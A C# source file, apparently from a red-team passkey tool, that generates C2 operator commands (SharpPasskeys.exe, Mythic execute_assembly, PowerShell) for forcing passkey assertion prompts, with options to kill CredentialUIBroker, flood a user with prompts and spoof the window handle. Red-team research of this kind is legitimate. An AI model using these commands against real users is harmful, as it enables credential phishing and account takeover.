using System.Collections.ObjectModel;
using System.Text.RegularExpressions;
using CommunityToolkit.Mvvm.ComponentModel;

namespace SpecterOps.Passkeys.Injector;

/// <summary>
/// ViewModel for the C2 Commands dialog. Generates CLI commands from assertion request options.
/// </summary>
public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDialogViewModel
{
    public static IReadOnlyList<PublicKeyCredentialHint> AuthenticatorTypeHints { get; } =
        Enum.GetValues<PublicKeyCredentialHint>();

    private static readonly Dictionary<string, PublicKeyCredentialHint> s_webAuthnHintMap = new()
    {
        [WebAuthnConstants.HintClientDevice] = PublicKeyCredentialHint.ClientDevice,
        [WebAuthnConstants.HintSecurityKey] = PublicKeyCredentialHint.SecurityKey,
        [WebAuthnConstants.HintHybrid] = PublicKeyCredentialHint.Hybrid
    };

    private static readonly Dictionary<PublicKeyCredentialHint, string> s_authenticatorCliMap = new()
    {
        [PublicKeyCredentialHint.ClientDevice] = nameof(PublicKeyCredentialHint.ClientDevice),
        [PublicKeyCredentialHint.SecurityKey] = nameof(PublicKeyCredentialHint.SecurityKey),
        [PublicKeyCredentialHint.Hybrid] = nameof(PublicKeyCredentialHint.Hybrid)
    };

    private readonly string _rpId;
    private readonly string _challenge;
    private readonly IReadOnlyList<string> _credentialIds;

    /// <summary>
    /// Gets or sets the selected authenticator type hint.
    /// </summary>
    [ObservableProperty]
    private PublicKeyCredentialHint _selectedAuthenticatorTypeHint;

    /// <summary>
    /// Gets or sets whether the kill flag is enabled.
    /// </summary>
    [ObservableProperty]
    private bool _killCredentialUIBroker;

    /// <summary>
    /// Gets or sets whether the flood flag is enabled.
    /// </summary>
    [ObservableProperty]
    private bool _promptFlood;

    /// <summary>
    /// Gets or sets whether the spoof flag is enabled.
    /// </summary>
    [ObservableProperty]
    private bool _spoofWindowHandle;

    /// <summary>
    /// Gets the list of standalone SharpPasskeys.exe CLI commands to display.
    /// </summary>
    public ObservableCollection<string> StandaloneCommands { get; } = [];

    /// <summary>
    /// Gets the list of Mythic Apollo SharpPasskeys commands to display.
    /// </summary>
    public ObservableCollection<string> MythicCommands { get; } = [];

    /// <summary>
    /// Gets the list of PowerShell commands to display.
    /// </summary>
    public ObservableCollection<string> PowerShellCommands { get; } = [];

    public C2CommandsDialogViewModel(PublicKeyCredentialRequestOptions assertionOptions)
    {
        ArgumentNullException.ThrowIfNull(assertionOptions);

        // Validate all page-controlled inputs once here so the command builders below only work
        // with trusted values and cannot accidentally emit operator-side injection payloads.
        _rpId = ValidateRelyingPartyId(assertionOptions.RpId);
        _challenge = ValidateBase64UrlToken(assertionOptions.Challenge, nameof(assertionOptions.Challenge));

        List<string> credentialIds = [];
        if (assertionOptions.AllowCredentials is { Length: > 0 } allowCredentials)
        {
            foreach (var credential in allowCredentials)
            {
                // Credential IDs are copied verbatim into generated commands, so keep the same
                // allowlist discipline as the challenge field.
                credentialIds.Add(ValidateBase64UrlToken(credential.Id, nameof(credential.Id)));
            }
        }

        _credentialIds = credentialIds;
        _selectedAuthenticatorTypeHint = ResolveDefaultHint(assertionOptions.Hints);
        RebuildAllCommands();
    }

    partial void OnSelectedAuthenticatorTypeHintChanged(PublicKeyCredentialHint value) => RebuildAllCommands();

    partial void OnKillCredentialUIBrokerChanged(bool value) => RebuildAllCommands();

    partial void OnPromptFloodChanged(bool value) => RebuildAllCommands();

    partial void OnSpoofWindowHandleChanged(bool value) => RebuildAllCommands();

    private void RebuildAllCommands()
    {
        SharpPasskeysRebuildCommands();
        MythicRebuildCommands();
        PowerShellRebuildCommands();
    }

    private void SharpPasskeysRebuildCommands()
    {
        StandaloneCommands.Clear();

        string optionalParameters = SharpPasskeysBuildOptionalParameters();

        StandaloneCommands.Add($"SharpPasskeys.exe prompt --relying-party {_rpId}{optionalParameters} --challenge {_challenge}");

        foreach (string credentialId in _credentialIds)
        {
            StandaloneCommands.Add($"SharpPasskeys.exe prompt --relying-party {_rpId} --credential-id {credentialId}{optionalParameters} --challenge {_challenge}");
        }
    }

    private void MythicRebuildCommands()
    {
        MythicCommands.Clear();
        MythicCommands.Add("register_assembly -existingFile SharpPasskeys.exe");

        string optionalParameters = SharpPasskeysBuildOptionalParameters();
        string baseArgs = $"prompt --relying-party {_rpId}{optionalParameters} --challenge {_challenge}";
        string baseCommand = $"execute_assembly -Assembly SharpPasskeys.exe -Arguments \"{baseArgs}\"";

        MythicCommands.Add(baseCommand);

        foreach (string credentialId in _credentialIds)
        {
            string credArgs = $"prompt --relying-party {_rpId} --credential-id {credentialId}{optionalParameters} --challenge {_challenge}";
            MythicCommands.Add($"execute_assembly -Assembly SharpPasskeys.exe -Arguments \"{credArgs}\"");
        }
    }

    private void PowerShellRebuildCommands()
    {
        PowerShellCommands.Clear();
        PowerShellCommands.Add("Import-Module -Name DSInternals.Passkeys");

        string hintParameter = s_authenticatorCliMap.TryGetValue(SelectedAuthenticatorTypeHint, out var hintValue)
            ? $" -Hint {hintValue}"
            : string.Empty;
        string windowHandleParameter = SpoofWindowHandle ? " -WindowHandle 0" : string.Empty;

        PowerShellCommands.Add(PowerShellPrependKillBroker(PowerShellWrapWithPromptFlood($"Test-Passkey -RelyingPartyId {_rpId}{hintParameter}{windowHandleParameter} -Challenge {_challenge}")));

        foreach (string credentialId in _credentialIds)
        {
            PowerShellCommands.Add(PowerShellPrependKillBroker(PowerShellWrapWithPromptFlood($"Test-Passkey -RelyingPartyId {_rpId} -CredentialId {credentialId}{hintParameter}{windowHandleParameter} -Challenge {_challenge}")));
        }
    }

    private string SharpPasskeysBuildOptionalParameters()
    {
        var parameters = new List<string>();

        if (KillCredentialUIBroker)
        {
            parameters.Add("--kill");
        }

        if (PromptFlood)
        {
            parameters.Add("--flood");
        }

        if (SpoofWindowHandle)
        {
            parameters.Add("--hwnd 0");
        }

        if (s_authenticatorCliMap.TryGetValue(SelectedAuthenticatorTypeHint, out var authenticatorValue))
        {
            parameters.Add($"--authenticator {authenticatorValue}");
        }

        return parameters.Count > 0 ? " " + string.Join(" ", parameters) : string.Empty;
    }

    private string PowerShellWrapWithPromptFlood(string command)
    {
        return PromptFlood ? $"1..600 | % {{ {command}; sleep 1 }}" : command;
    }

    private string PowerShellPrependKillBroker(string command)
    {
        return KillCredentialUIBroker ? $"1..2 | % {{ kill -n CredentialUIBroker; sleep 1 }}; {command}" : command;
    }

    private static string ValidateRelyingPartyId(string? rpId)
    {
        string safeRpId = rpId?.Trim() ?? string.Empty;
        if (safeRpId.Length == 0 || !SafeRelyingPartyIdRegex().IsMatch(safeRpId))
        {
            throw new ArgumentException("The relying party identifier contains unexpected characters.", nameof(rpId));
        }

        return safeRpId;
    }

    private static string ValidateBase64UrlToken(string? value, string fieldName)
    {
        string safeValue = value?.Trim() ?? string.Empty;
        if (safeValue.Length == 0 || !SafeBase64UrlTokenRegex().IsMatch(safeValue))
        {
            throw new ArgumentException($"The {fieldName} is not a base64url literal.", fieldName);
        }

        return safeValue;
    }

    /// <summary>
    /// Matches base64url tokens used by WebAuthn for challenge and credential identifier fields,
    /// allowing only the URL-safe alphabet expected by those values.
    /// </summary>
    [GeneratedRegex("^[A-Za-z0-9_-]+$", RegexOptions.CultureInvariant)]
    private static partial Regex SafeBase64UrlTokenRegex();

    /// <summary>
    /// Matches RP IDs that look like hostnames or <c>localhost</c>, which is the shape expected
    /// for relying-party identifiers and excludes arbitrary shell-relevant text.
    /// </summary>
    [GeneratedRegex("^(?=.{1,253}$)(?:localhost|(?:(?!-)[A-Za-z0-9-]{1,63}(?<!-))(?:\\.(?:(?!-)[A-Za-z0-9-]{1,63}(?<!-)))*?)$", RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex SafeRelyingPartyIdRegex();

    private static PublicKeyCredentialHint ResolveDefaultHint(string[]? hints)
    {
        if (hints is { Length: > 0 } && s_webAuthnHintMap.TryGetValue(hints[0], out var mapped))
        {
            return mapped;
        }

        return PublicKeyCredentialHint.None;
    }
}
